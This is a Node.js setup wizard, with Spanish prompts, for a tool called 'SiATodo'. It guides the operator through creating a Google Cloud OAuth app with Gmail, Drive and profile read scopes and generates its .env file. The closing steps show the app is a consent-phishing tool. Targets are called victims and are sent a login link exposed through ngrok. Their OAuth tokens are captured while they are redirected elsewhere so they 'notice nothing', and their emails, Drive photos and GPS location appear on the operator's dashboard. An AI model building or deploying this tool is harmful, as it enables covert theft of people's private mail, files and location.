#!/usr/bin/env node
/**
 * SiATodo — Setup Wizard para Google Cloud Platform
 * Guía interactiva paso a paso para configurar el proyecto completo
 */

const readline = require('readline');
const fs       = require('fs');
const path     = require('path');
const { execSync } = require('child_process');

// ── Colores ANSI ──────────────────────────────────────────────────────────────
const c = {
  reset:  '\x1b[0m',
  bold:   '\x1b[1m',
  dim:    '\x1b[2m',
  cyan:   '\x1b[36m',
  green:  '\x1b[32m',
  yellow: '\x1b[33m',
  red:    '\x1b[31m',
  blue:   '\x1b[34m',
  white:  '\x1b[37m',
  bgBlue: '\x1b[44m',
  bgGreen:'\x1b[42m',
};

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = (q) => new Promise(resolve => rl.question(q, resolve));

// Datos que vamos acumulando
const config = {
  clientId:     '',
  clientSecret: '',
  redirectUri:  'http://localhost:3000/auth/google/callback',
  sessionSecret: require('crypto').randomBytes(32).toString('hex'),
  port:         '3000',
  mapsKey:      '',
  testEmails:   []
};

// ── Helpers de UI ─────────────────────────────────────────────────────────────
function cls() { process.stdout.write('\x1b[2J\x1b[0f'); }

function header(step, total, title) {
  console.log('\n' + c.bgBlue + c.white + c.bold + ` SIATODO SETUP ` + c.reset +
              c.dim + ` paso ${step}/${total}` + c.reset);
  console.log(c.cyan + c.bold + `\n  ${title}` + c.reset);
  console.log(c.dim + '  ' + '─'.repeat(60) + c.reset + '\n');
}

function info(msg)    { console.log(c.blue   + '  ℹ  ' + c.reset + msg); }
function ok(msg)      { console.log(c.green  + '  ✅ ' + c.reset + msg); }
function warn(msg)    { console.log(c.yellow + '  ⚠  ' + c.reset + msg); }
function step(msg)    { console.log(c.cyan   + '  →  ' + c.reset + c.bold + msg + c.reset); }
function url(u)       { console.log(c.yellow + c.bold + '\n  🔗  ' + u + c.reset + '\n'); }
function code(s)      { console.log(c.dim    + '      ' + s + c.reset); }
function nl()         { console.log(); }

async function pressEnter(msg = 'Presioná ENTER cuando hayas completado este paso...') {
  await ask(c.green + '\n  ▶  ' + c.reset + c.bold + msg + c.reset + ' ');
}

async function askValue(label, defaultVal = '') {
  const hint = defaultVal ? c.dim + ` [${defaultVal}]` + c.reset : '';
  const val  = await ask(c.cyan + '  ✏  ' + c.reset + label + hint + ': ');
  return val.trim() || defaultVal;
}

function banner() {
  cls();
  console.log(c.cyan + c.bold + `
  ╔═══════════════════════════════════════════════════════════╗
  ║                                                           ║
  ║        SiATodo — Google Cloud Setup Wizard                ║
  ║        Configuración completa paso a paso                 ║
  ║                                                           ║
  ╚═══════════════════════════════════════════════════════════╝
` + c.reset);
  console.log(c.dim + '  Este script te guía para configurar todo en Google Cloud' + c.reset);
  console.log(c.dim + '  Platform y genera el .env al final automáticamente.\n' + c.reset);
}

function openBrowser(url_str) {
  try {
    const cmd = process.platform === 'win32' ? `start "" "${url_str}"` :
                process.platform === 'darwin' ? `open "${url_str}"` :
                `xdg-open "${url_str}" 2>/dev/null || echo "Abrí manualmente: ${url_str}"`;
    execSync(cmd, { stdio: 'ignore' });
  } catch {
    // silencioso si falla
  }
}

// ── PASOS ─────────────────────────────────────────────────────────────────────

async function paso1_consola() {
  header(1, 10, 'Abrir Google Cloud Console');

  info('Vamos a abrir Google Cloud Console en tu navegador.');
  info('Necesitás estar logueado con la cuenta de Google que va a ser el DUEÑO del proyecto.');
  nl();
  warn('Esta cuenta NO es la víctima — es la tuya, la que administra el proyecto.');
  nl();

  step('Abriendo Google Cloud Console...');
  openBrowser('https://console.cloud.google.com');
  url('https://console.cloud.google.com');

  await pressEnter('cuando la consola esté abierta en tu navegador');
}

async function paso2_proyecto() {
  header(2, 10, 'Crear el proyecto "Si-A-Todo"');

  step('Abriendo el selector de proyectos...');
  openBrowser('https://console.cloud.google.com/projectcreate');
  url('https://console.cloud.google.com/projectcreate');

  nl();
  info('En la pantalla de creación completá así:');
  nl();
  console.log(c.bold + '    Nombre del proyecto:' + c.reset + c.green + '  Si-A-Todo' + c.reset);
  console.log(c.bold + '    ID del proyecto:     ' + c.reset + c.dim  + '  (se genera automáticamente, podés dejarlo)' + c.reset);
  console.log(c.bold + '    Organización:        ' + c.reset + c.dim  + '  (sin organización si es cuenta personal)' + c.reset);
  nl();
  step('Hacé click en "CREAR" y esperá que se cree el proyecto.');

  await pressEnter('cuando el proyecto "Si-A-Todo" esté creado y seleccionado');
  ok('Proyecto creado.');
}

async function paso3_apis() {
  header(3, 10, 'Habilitar las APIs necesarias');

  info('Necesitamos habilitar 4 APIs. Abrimos cada una:');
  nl();

  const apis = [
    { nombre: 'Google People API',    desc: 'Para obtener nombre, email y avatar del usuario',   id: 'people.googleapis.com' },
    { nombre: 'Gmail API',            desc: 'Para leer los correos del usuario',                 id: 'gmail.googleapis.com' },
    { nombre: 'Google Drive API',     desc: 'Para acceder a las imágenes del Drive',             id: 'drive.googleapis.com' },
    { nombre: 'Cloud Resource Manager API', desc: 'Requerida internamente por el SDK',          id: 'cloudresourcemanager.googleapis.com' },
  ];

  for (let i = 0; i < apis.length; i++) {
    const api = apis[i];
    nl();
    console.log(c.bold + c.cyan + `  [${i+1}/4] ${api.nombre}` + c.reset);
    console.log(c.dim + `       ${api.desc}` + c.reset);
    nl();

    const link = `https://console.cloud.google.com/apis/library/${api.id}`;
    step('Abriendo...');
    openBrowser(link);
    url(link);

    warn('Buscá el botón "HABILITAR" y hacé click. Si dice "ADMINISTRAR" ya está habilitada.');
    await pressEnter(`cuando la ${api.nombre} esté habilitada`);
    ok(`${api.nombre} habilitada.`);
  }
}

async function paso4_pantalla_consentimiento() {
  header(4, 10, 'Configurar pantalla de consentimiento OAuth');

  step('Abriendo configuración de pantalla OAuth...');
  openBrowser('https://console.cloud.google.com/apis/credentials/consent');
  url('https://console.cloud.google.com/apis/credentials/consent');

  nl();
  info('Completá la pantalla de consentimiento así:');
  nl();

  console.log(c.bold + '  PASO A:' + c.reset + ' Tipo de usuario');
  console.log('    → Seleccioná ' + c.green + c.bold + '"Externo"' + c.reset + ' y hacé click en CREAR');
  nl();

  console.log(c.bold + '  PASO B:' + c.reset + ' Información de la app');
  console.log('    ' + c.bold + 'Nombre de la app:       ' + c.reset + c.green + 'SiATodo' + c.reset);
  console.log('    ' + c.bold + 'Email de asistencia:    ' + c.reset + c.dim   + '(tu email de Google)' + c.reset);
  console.log('    ' + c.bold + 'Email del desarrollador:' + c.reset + c.dim   + '(tu email de Google)' + c.reset);
  console.log('    ' + c.dim  + '    (el resto de los campos podés dejarlo vacío)' + c.reset);
  nl();

  console.log(c.bold + '  PASO C:' + c.reset + ' Permisos (Scopes) — hacé click en "AGREGAR O QUITAR PERMISOS"');
  nl();
  const scopes = [
    '.../auth/userinfo.email',
    '.../auth/userinfo.profile',
    '.../auth/gmail.readonly',
    '.../auth/drive.readonly',
  ];
  scopes.forEach(s => console.log(c.green + '    ✓ ' + c.reset + s));
  nl();
  warn('Buscá cada uno en el buscador del modal y tildálos. Luego "ACTUALIZAR" y "GUARDAR Y CONTINUAR".');
  nl();

  await pressEnter('cuando la pantalla de consentimiento esté guardada');
  ok('Pantalla de consentimiento configurada.');
}

async function paso5_testers() {
  header(5, 10, 'Agregar cuentas de prueba (Test Users)');

  info('Mientras la app esté en modo "Testing", solo las cuentas que agregues acá');
  info('pueden autenticarse. Agregá todas las que quieras probar como víctimas.');
  nl();

  step('Abriendo sección de testers...');
  openBrowser('https://console.cloud.google.com/apis/credentials/consent');
  url('https://console.cloud.google.com/apis/credentials/consent');

  nl();
  info('En la pantalla de consentimiento:');
  console.log('    → Hacé click en la pestaña ' + c.green + c.bold + '"Usuarios de prueba"' + c.reset);
  console.log('    → Hacé click en ' + c.green + c.bold + '"+ AGREGAR USUARIOS"' + c.reset);
  console.log('    → Ingresá los emails separados por coma o uno por uno');
  nl();

  let agregando = true;
  while (agregando) {
    const email = await askValue('Email a agregar como tester (Enter para terminar)');
    if (!email) {
      agregando = false;
    } else {
      config.testEmails.push(email);
      ok(`${email} anotado.`);
    }
  }

  if (config.testEmails.length === 0) {
    warn('No anotaste ningún email. Acordate de agregarlos manualmente en GCP.');
  } else {
    nl();
    info('Emails a agregar en GCP:');
    config.testEmails.forEach(e => console.log(c.green + '    • ' + c.reset + e));
  }

  nl();
  await pressEnter('cuando hayas agregado todos los testers en GCP y guardado');
  ok('Testers configurados.');
}

async function paso6_credenciales() {
  header(6, 10, 'Crear credenciales OAuth 2.0');

  step('Abriendo sección de credenciales...');
  openBrowser('https://console.cloud.google.com/apis/credentials');
  url('https://console.cloud.google.com/apis/credentials');

  nl();
  info('En la pantalla de credenciales:');
  nl();
  console.log('  1. Hacé click en ' + c.green + c.bold + '"+ CREAR CREDENCIALES"' + c.reset);
  console.log('  2. Seleccioná ' + c.green + c.bold + '"ID de cliente de OAuth"' + c.reset);
  console.log('  3. En "Tipo de aplicación" elegí ' + c.green + c.bold + '"Aplicación web"' + c.reset);
  console.log('  4. Nombre: ' + c.green + c.bold + 'SiATodo Web Client' + c.reset);
  nl();
  console.log('  5. En ' + c.bold + '"URIs de redireccionamiento autorizados"' + c.reset + ' hacé click en');
  console.log('     "+ AGREGAR URI" y pegá exactamente esto:');
  nl();
  console.log(c.bgBlue + c.white + c.bold + '     http://localhost:3000/auth/google/callback     ' + c.reset);
  nl();
  warn('Importante: sin barra al final, sin https, exactamente como está arriba.');
  nl();
  console.log('  6. Hacé click en ' + c.green + c.bold + '"CREAR"' + c.reset);
  nl();
  info('Aparece un popup con "Tu ID de cliente" y "Tu secreto de cliente".');
  warn('NO CERRÉS ESE POPUP — necesitás copiar los dos valores ahora.');
  nl();

  await pressEnter('cuando veas el popup con las credenciales');

  nl();
  config.clientId = await askValue('Pegá el CLIENT ID (termina en .apps.googleusercontent.com)');
  config.clientSecret = await askValue('Pegá el CLIENT SECRET');

  if (!config.clientId || !config.clientSecret) {
    warn('No pegaste las credenciales. Podés editarlas después en el .env.');
  } else {
    ok('Credenciales guardadas.');
  }
}

async function paso7_redirect_uri() {
  header(7, 10, 'Verificar URI de redirección');

  info('La URI de redirección ya fue configurada en el paso anterior.');
  info('Confirmemos que quedó bien guardada.');
  nl();

  step('Abriendo credenciales para verificar...');
  openBrowser('https://console.cloud.google.com/apis/credentials');
  url('https://console.cloud.google.com/apis/credentials');

  nl();
  console.log('  → Hacé click en tu credencial "SiATodo Web Client"');
  console.log('  → En "URIs de redireccionamiento autorizados" debe aparecer:');
  nl();
  console.log(c.bgBlue + c.white + c.bold + '     http://localhost:3000/auth/google/callback     ' + c.reset);
  nl();

  const ok_uri = await askValue('¿Está correcta la URI? (s/n)', 's');
  if (ok_uri.toLowerCase() !== 's') {
    warn('Agregala manualmente: editá la credencial → "AGREGAR URI" → pegá la URL → GUARDAR.');
    await pressEnter('cuando la URI esté guardada correctamente');
  }
  ok('URI de redirección verificada.');
}

async function paso8_maps_opcional() {
  header(8, 10, 'Google Maps API Key (opcional para GPS)');

  info('Sin esta key el GPS funciona igual, pero el mapa embed puede ser de menor calidad.');
  nl();

  const quiere = await askValue('¿Querés configurar una Maps API Key? (s/n)', 'n');

  if (quiere.toLowerCase() === 's') {
    step('Abriendo creación de API Key...');
    openBrowser('https://console.cloud.google.com/apis/credentials');
    url('https://console.cloud.google.com/apis/credentials');

    nl();
    console.log('  1. Click en "+ CREAR CREDENCIALES"');
    console.log('  2. Seleccioná "Clave de API"');
    console.log('  3. Copiá la clave generada');
    nl();
    warn('Recomendado: restringí la clave a "Maps Embed API" para mayor seguridad.');
    nl();

    await pressEnter('cuando tengas la API Key');
    config.mapsKey = await askValue('Pegá la Maps API Key (o Enter para omitir)');

    if (config.mapsKey) ok('Maps API Key guardada.');
    else info('Omitido. El GPS funcionará sin mapa embed mejorado.');
  } else {
    info('Omitido. El GPS funcionará igualmente con el embed básico de Google Maps.');
  }
}

async function paso9_generar_env() {
  header(9, 10, 'Generando archivo .env');

  const envPath = path.join(process.cwd(), '.env');

  const envContent = `# ── SiATodo — Configuración ──────────────────────────────────────────────────
# Generado automáticamente por setup.js el ${new Date().toLocaleString('es-AR')}

# Google OAuth2 Credentials
# Obtenidas en: GCP → APIs y servicios → Credenciales → SiATodo Web Client
GOOGLE_CLIENT_ID=${config.clientId}
GOOGLE_CLIENT_SECRET=${config.clientSecret}

# URI de redirección (debe coincidir exactamente con la configurada en GCP)
GOOGLE_REDIRECT_URI=${config.redirectUri}

# Secreto de sesión (generado automáticamente — no modificar)
SESSION_SECRET=${config.sessionSecret}

# Puerto del servidor
PORT=${config.port}

# Google Maps API Key (opcional — mejora el embed del mapa en /gps)
# Dejá vacío si no la configuraste
GOOGLE_MAPS_KEY=${config.mapsKey}
`;

  // Backup si ya existe un .env
  if (fs.existsSync(envPath)) {
    const backup = envPath + '.backup.' + Date.now();
    fs.copyFileSync(envPath, backup);
    warn(`.env anterior respaldado en: ${backup}`);
  }

  fs.writeFileSync(envPath, envContent);
  ok(`.env creado en: ${envPath}`);

  nl();
  console.log(c.dim + '─'.repeat(64) + c.reset);
  console.log(c.bold + '\n  Contenido del .env generado:\n' + c.reset);
  console.log(c.dim + envContent + c.reset);
  console.log(c.dim + '─'.repeat(64) + c.reset);
}

async function paso10_resumen() {
  header(10, 10, '¡Setup completo! Cómo levantar SiATodo');

  ok('Todo configurado correctamente.\n');

  console.log(c.bold + c.cyan + '  ══════════════════════════════════════════' + c.reset);
  console.log(c.bold + c.cyan + '   CÓMO LEVANTAR EL SERVIDOR' + c.reset);
  console.log(c.bold + c.cyan + '  ══════════════════════════════════════════\n' + c.reset);

  step('1. Instalá las dependencias (solo la primera vez):');
  nl();
  console.log(c.bgBlue + c.white + c.bold + '     npm install     ' + c.reset);
  nl();

  step('2. Levantá el servidor:');
  nl();
  console.log(c.bgBlue + c.white + c.bold + '     node app.js     ' + c.reset);
  nl();

  step('3. Abrí el dashboard (TU panel de control):');
  nl();
  console.log(c.green + c.bold + '     http://localhost:3000/dashboard' + c.reset);
  nl();

  step('4. Para capturar una víctima, mandále el link de login:');
  nl();
  console.log(c.yellow + c.bold + '     http://localhost:3000/' + c.reset);
  nl();
  warn('Para que funcione remotamente necesitás exponer el servidor con ngrok:');
  nl();
  code('npm install -g ngrok');
  code('ngrok http 3000');
  nl();
  info('ngrok te da una URL pública tipo https://abc123.ngrok.io que podés compartir.');
  nl();

  console.log(c.bold + c.cyan + '  ══════════════════════════════════════════' + c.reset);
  console.log(c.bold + c.cyan + '   FLUJO COMPLETO' + c.reset);
  console.log(c.bold + c.cyan + '  ══════════════════════════════════════════\n' + c.reset);

  const pasos_flujo = [
    ['Víctima abre tu link',            'http://tu-servidor/'],
    ['Hace login con su Google',         'OAuth flow → tokens capturados'],
    ['Es redirigida a hefin.net',        'no nota nada raro'],
    ['Vos abrís tu dashboard',          'http://localhost:3000/dashboard'],
    ['Ves sus correos',                  'http://localhost:3000/emails'],
    ['Ves sus fotos (Drive)',            'http://localhost:3000/photos'],
    ['Si abrió GPS desde su dispositivo','http://localhost:3000/gps → su ubicación'],
  ];
  pasos_flujo.forEach(([a, b]) => {
    console.log(c.green + '  ✓ ' + c.reset + c.bold + a.padEnd(36) + c.reset + c.dim + b + c.reset);
  });

  nl();

  if (config.testEmails.length > 0) {
    console.log(c.bold + c.cyan + '  ══════════════════════════════════════════' + c.reset);
    console.log(c.bold + c.cyan + '   TESTERS CONFIGURADOS' + c.reset);
    console.log(c.bold + c.cyan + '  ══════════════════════════════════════════\n' + c.reset);
    config.testEmails.forEach(e => console.log(c.green + '  ✓ ' + c.reset + e));
    nl();
    warn('Recordá que solo estas cuentas pueden autenticarse mientras la app esté en Testing.');
    warn('Para producción (cualquier cuenta) hay que verificar la app en Google.');
    nl();
  }

  console.log(c.green + c.bold + '\n  ¡Todo listo! Corré: node app.js\n' + c.reset);
}

// ── Main ──────────────────────────────────────────────────────────────────────
async function main() {
  banner();
  await pressEnter('para comenzar el setup');

  await paso1_consola();
  await paso2_proyecto();
  await paso3_apis();
  await paso4_pantalla_consentimiento();
  await paso5_testers();
  await paso6_credenciales();
  await paso7_redirect_uri();
  await paso8_maps_opcional();
  await paso9_generar_env();
  await paso10_resumen();

  rl.close();
}

main().catch(err => {
  console.error(c.red + '\nError en setup: ' + err.message + c.reset);
  rl.close();
  process.exit(1);
});
